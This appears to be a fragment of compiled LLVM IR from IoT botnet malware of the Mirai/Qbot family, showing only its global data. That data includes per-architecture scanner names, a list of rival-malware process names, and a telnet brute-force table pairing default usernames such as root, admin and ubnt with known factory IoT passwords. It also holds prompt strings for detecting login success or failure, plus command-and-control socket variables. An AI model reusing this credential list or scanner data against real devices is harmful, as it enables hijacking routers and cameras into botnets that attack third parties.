@.str.131 = private unnamed_addr constant [7 x i8] c"scanHA\00", align 1
@.str.132 = private unnamed_addr constant [13 x i8] c"alie293z0k2L\00", align 1
@.str.133 = private unnamed_addr constant [13 x i8] c"scanJoshoARM\00", align 1
@.str.134 = private unnamed_addr constant [11 x i8] c"HellInSide\00", align 1
@.str.135 = private unnamed_addr constant [13 x i8] c"ayyyGangShit\00", align 1
@.str.136 = private unnamed_addr constant [14 x i8] c"scanJoshoARM5\00", align 1
@.str.137 = private unnamed_addr constant [8 x i8] c"HighFry\00", align 1
@.str.138 = private unnamed_addr constant [5 x i8] c"b1gl\00", align 1
@.str.139 = private unnamed_addr constant [14 x i8] c"scanJoshoARM6\00", align 1
@.str.140 = private unnamed_addr constant [11 x i8] c"IWhPyucDbJ\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"boatnetz\00", align 1
@.str.142 = private unnamed_addr constant [14 x i8] c"scanJoshoARM7\00", align 1
@.str.143 = private unnamed_addr constant [11 x i8] c"IuYgujeIqn\00", align 1
@.str.144 = private unnamed_addr constant [10 x i8] c"btbatrtah\00", align 1
@.str.145 = private unnamed_addr constant [14 x i8] c"scanJoshoM68K\00", align 1
@.str.146 = private unnamed_addr constant [13 x i8] c"JJDUHEWBBBIB\00", align 1
@.str.147 = private unnamed_addr constant [2 x i8] c"c\00", align 1
@.str.148 = private unnamed_addr constant [14 x i8] c"scanJoshoMIPS\00", align 1
@.str.149 = private unnamed_addr constant [14 x i8] c"JSDGIEVIVAVIG\00", align 1
@.str.150 = private unnamed_addr constant [11 x i8] c"cKbVkzGOPa\00", align 1
@.str.151 = private unnamed_addr constant [14 x i8] c"scanJoshoMPSL\00", align 1
@.str.152 = private unnamed_addr constant [5 x i8] c"ccAD\00", align 1
@.str.153 = private unnamed_addr constant [13 x i8] c"scanJoshoPPC\00", align 1
@.str.154 = private unnamed_addr constant [12 x i8] c"KAZEN-OIU97\00", align 1
@.str.155 = private unnamed_addr constant [13 x i8] c"chickenxings\00", align 1
@.str.156 = private unnamed_addr constant [13 x i8] c"scanJoshoSH4\00", align 1
@.str.157 = private unnamed_addr constant [10 x i8] c"yakuskzm8\00", align 1
@.str.158 = private unnamed_addr constant [12 x i8] c"KAZEN-PO78H\00", align 1
@.str.159 = private unnamed_addr constant [8 x i8] c"cleaner\00", align 1
@.str.160 = private unnamed_addr constant [13 x i8] c"scanJoshoSPC\00", align 1
@.str.161 = private unnamed_addr constant [10 x i8] c"yakuv4vxc\00", align 1
@.str.162 = private unnamed_addr constant [12 x i8] c"KAZEN-U79OL\00", align 1
@.str.163 = private unnamed_addr constant [6 x i8] c"dbeef\00", align 1
@.str.164 = private unnamed_addr constant [13 x i8] c"scanJoshoX86\00", align 1
@.str.165 = private unnamed_addr constant [10 x i8] c"yakuz4c24\00", align 1
@.str.166 = private unnamed_addr constant [10 x i8] c"KETASHI32\00", align 1
@.str.167 = private unnamed_addr constant [10 x i8] c"ddrwelper\00", align 1
@.str.168 = private unnamed_addr constant [9 x i8] c"scanarm5\00", align 1
@.str.169 = private unnamed_addr constant [11 x i8] c"zPnr6HpQj2\00", align 1
@.str.170 = private unnamed_addr constant [13 x i8] c"Kaishi-Iz90Y\00", align 1
@.str.171 = private unnamed_addr constant [7 x i8] c"deexec\00", align 1
@.str.172 = private unnamed_addr constant [9 x i8] c"scanarm6\00", align 1
@.str.173 = private unnamed_addr constant [10 x i8] c"zdrtfxcgy\00", align 1
@.str.174 = private unnamed_addr constant [10 x i8] c"Katrina32\00", align 1
@.str.175 = private unnamed_addr constant [9 x i8] c"doCP3fVj\00", align 1
@.str.176 = private unnamed_addr constant [9 x i8] c"scanarm7\00", align 1
@.str.177 = private unnamed_addr constant [9 x i8] c"zxcfhuio\00", align 1
@.str.178 = private unnamed_addr constant [11 x i8] c"Ksif91je39\00", align 1
@.str.179 = private unnamed_addr constant [9 x i8] c"scanm68k\00", align 1
@.str.180 = private unnamed_addr constant [6 x i8] c"Kuasa\00", align 1
@.str.181 = private unnamed_addr constant [10 x i8] c"dvrpelper\00", align 1
@.str.182 = private unnamed_addr constant [9 x i8] c"scanmips\00", align 1
@.str.183 = private unnamed_addr constant [14 x i8] c"KuasaBinsMate\00", align 1
@.str.184 = private unnamed_addr constant [11 x i8] c"eQnOhRk85r\00", align 1
@.str.185 = private unnamed_addr constant [9 x i8] c"scanmpsl\00", align 1
@.str.186 = private unnamed_addr constant [14 x i8] c"LOLHHHOHOHBUI\00", align 1
@.str.187 = private unnamed_addr constant [11 x i8] c"eXK20CL12Z\00", align 1
@.str.188 = private unnamed_addr constant [8 x i8] c"scanppc\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@actualparent = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i32 0, align 4
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [99 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0)], align 16
@.str.189 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.190 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.191 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.192 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.193 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.194 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.195 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.196 = private unnamed_addr constant [5 x i8] c"adm\00\00", align 1
@.str.197 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.198 = private unnamed_addr constant [15 x i8] c"Administrator\00\00", align 1
@.str.199 = private unnamed_addr constant [8 x i8] c"mg3500\00\00", align 1
@.str.200 = private unnamed_addr constant [8 x i8] c"admin1\00\00", align 1
@.str.201 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.202 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = local_unnamed_addr global [98 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.206, i32 0, i32 0)], align 16
@.str.203 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.204 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.205 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.206 = private unnamed_addr constant [8 x i8] c"000000\00\00", align 1
@.str.207 = private unnamed_addr constant [7 x i8] c"14567\00\00", align 1
@.str.208 = private unnamed_addr constant [8 x i8] c"hi3518\00\00", align 1
@.str.209 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.210 = private unnamed_addr constant [9 x i8] c"admin14\00\00", align 1
@.str.211 = private unnamed_addr constant [14 x i8] c"7ujMko0admin\00\00", align 1
@.str.212 = private unnamed_addr constant [10 x i8] c"00000000\00\00", align 1
@.str.213 = private unnamed_addr constant [4 x i8] c"<>\00\00", align 1
@.str.214 = private unnamed_addr constant [6 x i8] c"klv1\00\00", align 1
@.str.215 = private unnamed_addr constant [7 x i8] c"klv14\00\00", align 1
@.str.216 = private unnamed_addr constant [10 x i8] c"oelinux1\00\00", align 1
@.str.217 = private unnamed_addr constant [9 x i8] c"realtek\00\00", align 1
@.str.218 = private unnamed_addr constant [6 x i8] c"1111\00\00", align 1
@.str.219 = private unnamed_addr constant [7 x i8] c"54321\00\00", align 1
@.str.220 = private unnamed_addr constant [8 x i8] c"antslq\00\00", align 1
@.str.221 = private unnamed_addr constant [9 x i8] c"zte9x15\00\00", align 1
@.str.222 = private unnamed_addr constant [8 x i8] c"system\00\00", align 1
@.str.223 = private unnamed_addr constant [6 x i8] c"1456\00\00", align 1
@.str.224 = private unnamed_addr constant [8 x i8] c"888888\00\00", align 1
@.str.225 = private unnamed_addr constant [6 x i8] c"ikwb\00\00", align 1
@.str.226 = private unnamed_addr constant [10 x i8] c"juantech\00\00", align 1
@.str.227 = private unnamed_addr constant [8 x i8] c"xc3511\00\00", align 1
@.str.228 = private unnamed_addr constant [9 x i8] c"1111111\00\00", align 1
@.str.229 = private unnamed_addr constant [9 x i8] c"service\00\00", align 1
@.str.230 = private unnamed_addr constant [5 x i8] c"145\00\00", align 1
@.str.231 = private unnamed_addr constant [6 x i8] c"4321\00\00", align 1
@.str.232 = private unnamed_addr constant [6 x i8] c"tech\00\00", align 1
@.str.233 = private unnamed_addr constant [6 x i8] c"abc1\00\00", align 1
@.str.234 = private unnamed_addr constant [8 x i8] c"switch\00\00", align 1
@.str.235 = private unnamed_addr constant [8 x i8] c"meinsm\00\00", align 1
@.str.236 = private unnamed_addr constant [10 x i8] c"smcadmin\00\00", align 1
@.str.237 = private unnamed_addr constant [10 x i8] c"14567890\00\00", align 1
@.str.238 = private unnamed_addr constant [4 x i8] c"14\00\00", align 1
@.str.239 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.240 = private unnamed_addr constant [8 x i8] c"merlin\00\00", align 1
@.str.241 = private unnamed_addr constant [7 x i8] c"zlxx.\00\00", align 1
@scanPid = local_unnamed_addr global i32 0, align 4
@advances = global [7 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* null], align 16
@.str.242 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.243 = private unnamed_addr constant [4 x i8] c"ser\00", align 1
@.str.244 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.245 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.246 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.247 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@fails = global [9 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.255, i32 0, i32 0), i8* null], align 16
@.str.248 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.249 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.250 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.251 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.252 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.253 = private unnamed_addr constant [8 x i8] c"goodbye\00", align 1
@.str.254 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.255 = private unnamed_addr constant [8 x i8] c"timeout\00", align 1
@successes = global [8 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.261, i32 0, i32 0), i8* null], align 16
@.str.256 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.257 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.258 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.259 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@.str.260 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.261 = private unnamed_addr constant [7 x i8] c"usybox\00", align 1
